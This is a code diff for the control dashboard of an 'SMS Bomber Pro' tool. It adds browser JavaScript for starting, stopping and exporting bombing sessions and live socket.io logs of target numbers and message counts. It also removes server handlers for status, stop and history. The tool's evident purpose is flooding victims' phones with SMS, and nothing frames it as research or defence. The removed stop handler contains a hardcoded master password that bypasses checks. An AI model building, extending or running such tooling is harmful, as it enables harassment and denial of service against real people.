+                    document.getElementById('modal-msg').style.color = 'var(--danger)';
+                } else {
+                    closeModal();
+                    showToast('success', 'Operation Stopped', data.message || 'Bomber stopped successfully');
+                    playSound('stop');
+                    await fetchData();
+                }
+            } catch (err) {
+                document.getElementById('modal-msg').textContent = 'Failed to stop bomber';
+                document.getElementById('modal-msg').style.color = 'var(--danger)';
+            } finally {
+                hideLoading();
+            }
+        }
+
+        // UI Helper Functions
+        function showLoading() {
+            document.getElementById('loading-overlay').classList.add('active');
+        }
+
+        function hideLoading() {
+            setTimeout(() => {
+                document.getElementById('loading-overlay').classList.remove('active');
+            }, 300);
+        }
+
+        function showToast(type, title, message) {
+            const toastContainer = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            toast.className = `toast toast-${type}`;
+            
+            const icons = {
+                success: 'fa-check-circle',
+                error: 'fa-exclamation-circle',
+                warning: 'fa-exclamation-triangle',
+                info: 'fa-info-circle'
+            };
+            
+            toast.innerHTML = `
+                <div class="toast-icon">
+                    <i class="fas ${icons[type]}"></i>
+                </div>
+                <div class="toast-content">
+                    <div class="toast-title">${title}</div>
+                    <div class="toast-message">${message}</div>
+                </div>
+                <div class="toast-progress"></div>
+            `;
+            
+            toastContainer.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.style.animation = 'toastSlideOut 0.5s ease forwards';
+                setTimeout(() => toast.remove(), 500);
+            }, 3000);
+        }
+
+        function shakeElement(id) {
+            const element = document.getElementById(id);
+            element.classList.add('shake');
+            setTimeout(() => element.classList.remove('shake'), 500);
+        }
+
+        function clearForm() {
+            document.getElementById('number').value = '';
+            document.getElementById('time').value = '1';
+            document.getElementById('password').value = '';
+        }
+
+        function playSound(type) {
+            if (!soundEnabled) return;
+            // Add sound playing logic here
+        }
+
+        // Settings Functions
+        function toggleSettings() {
+            const panel = document.getElementById('settings-panel');
+            panel.classList.toggle('active');
+        }
+
+        function exportData() {
+            const data = {
+                activeBombers,
+                history,
+                exportTime: new Date().toISOString()
+            };
+            
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `sms-bomber-data-${Date.now()}.json`;
+            a.click();
+            
+            showToast('success', 'Export Complete', 'Data exported successfully');
+        }
+
+        // Initialize
+        function init() {
+            initCharts();
+            
+            // Event Listeners
+            document.getElementById('start-btn').addEventListener('click', startBomber);
+            
+            document.getElementById('stop-modal').addEventListener('click', function(e) {
+                if (e.target === this) closeModal();
+            });
+            
+            document.getElementById('details-modal').addEventListener('click', function(e) {
+                if (e.target === this) closeDetails();
+            });
+            
+            // Toggle switches
+            document.getElementById('sound-toggle').addEventListener('click', function() {
+                this.classList.toggle('active');
+                soundEnabled = this.classList.contains('active');
+            });
+            
+            document.getElementById('alert-toggle').addEventListener('click', function() {
+                this.classList.toggle('active');
+            });
+            
+            // Enter key support
+            document.getElementById('password').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') startBomber();
+            });
+            
+            // Start data fetching
+            fetchData();
+            setInterval(fetchData);
+            setInterval(updateDateTime, 1000);
+            
+            // Welcome message
+            setTimeout(() => {
+                showToast('info', 'Welcome', 'SMS Bomber Pro is ready');
+            }, 1000);
+        }
+
+        // Start application
+        window.addEventListener('load', init);
+    </script>
+    <script src="/socket.io/socket.io.js"></script>
+<script>
+  const socket = io();
+
+  // ✅ bomber update আসলে UI আপডেট করো
+  socket.on("bomber_update", (data) => {
+    console.log("Live update:", data);
+
+    // Example UI update
+    const log = document.getElementById("liveLog");
+    if (log) {
+      const entry = document.createElement("div");
+      entry.textContent = `✔ ${data.target} → ${data.number} | Sent: ${data.totalSent} | Ping: ${data.lastPing}ms`;
+      log.prepend(entry);
+    }
   });
-}
 
-async function onStatus(req, res) {
-  const bombers = {};
-  for (const num in activeBombers) {
-    const data = { ...activeBombers[num] };
-    delete data.active;
-    delete data.password;
-    bombers[num] = data;
-  }
-  res.json(bombers);
-}
+  // ❌ stop event হলে UI থেকে remove করো
+  socket.on("bomber_stop", (data) => {
+    console.log("Bomber stopped:", data);
+    const log = document.getElementById("liveLog");
+    if (log) {
+      const entry = document.createElement("div");
+      entry.textContent = `🛑 Bomber stopped for ${data.number}`;
+      entry.style.color = "red";
+      log.prepend(entry);
+    }
+  });
+</script>
 
-async function onStop(req, res) {
-  const { number, password, master } = req.query;
-
-  if (!number || !password) {
-    return res.json({ error: "Missing parameters. Use ?number=&password=" });
-  }
-
-  if (!activeBombers[number]) {
-    return res.json({ error: "No bomber running on this number" });
-  }
-
-  if (activeBombers[number].password !== password && !(master === 'true' && password === 'alit')) {
-    return res.json({ error: "Incorrect password" });
-  }
-
-  activeBombers[number].active = false;
-  const data = { ...activeBombers[number], number, endTime: Date.now() };
-  delete data.active;
-  delete data.password;
-  history.push(data);
-  fs.writeFileSync(historyPath, JSON.stringify(history, null, 2));
-  delete activeBombers[number];
-  return res.json({ message: `Bomber stopped for ${number}` });
-  if (ioInstance) ioInstance.emit('bomber_stop', { number });
-}
-
-async function onHistory(req, res) {
-  res.json(history);
-}
-
-
-function onDashboard(req, res) {
-    res.sendFile(path.join(__dirname, 'boom.html'));
-}
-
-  
-
-// Set up express server if running directly
-
-
-
-module.exports = { meta, onStart, onStatus, onStop, onHistory, onDashboard, attachIO };
-
-
-
-
-
+</body>
+</html>
